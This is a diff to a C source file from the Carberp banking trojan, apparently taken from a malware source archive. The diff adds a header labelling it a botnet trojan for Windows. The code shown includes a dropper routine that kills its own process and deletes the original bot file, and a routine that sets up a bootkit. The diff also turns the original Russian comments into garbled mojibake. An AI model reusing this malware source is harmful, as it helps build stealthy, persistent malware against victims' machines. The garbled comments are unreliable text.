@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include "shlobj.h"
 #include <Memory.h>
@@ -15,7 +26,7 @@ VOID GetPaths(HINSTANCE);
 BOOL SetupBootKit();
 
 CHAR PathBkFile[ MAX_PATH ] = {0}; 
-CHAR FileToDelete[ MAX_PATH ] = {0}; //путь для удаления первоначального файла бота
+CHAR FileToDelete[ MAX_PATH ] = {0}; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 
 BOOL WINAPI DllMain (HINSTANCE hInst,DWORD Reason, PVOID Reserved)
 {
@@ -40,7 +51,7 @@ BOOL WINAPI DllMain (HINSTANCE hInst,DWORD Reason, PVOID Reserved)
 };
 
 //
-// получаем путь к дроперу для его удаления.
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 //
 VOID GetPaths(HINSTANCE hInst)
 {
@@ -53,7 +64,7 @@ VOID GetPaths(HINSTANCE hInst)
 };
 
 
-DWORD WINAPI DeleteDropper(LPVOID) // убиваем процесс, стираем файл
+DWORD WINAPI DeleteDropper(LPVOID) // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 {
 	LONG i = 1;
 	pMoveFileExA((PCHAR)FileToDelete,NULL,MOVEFILE_DELAY_UNTIL_REBOOT);
@@ -70,7 +81,7 @@ DWORD WINAPI DeleteDropper(LPVOID) // убиваем процесс, стираем файл
 BOOL SetupBootKit()
 {
 	BOOL ret = FALSE;
-	// Вызываем событие cтарта експлорера
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ cпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	
 	if ( (DWORD)pGetFileAttributesA(PathBkFile) == INVALID_FILE_ATTRIBUTES)
 	{
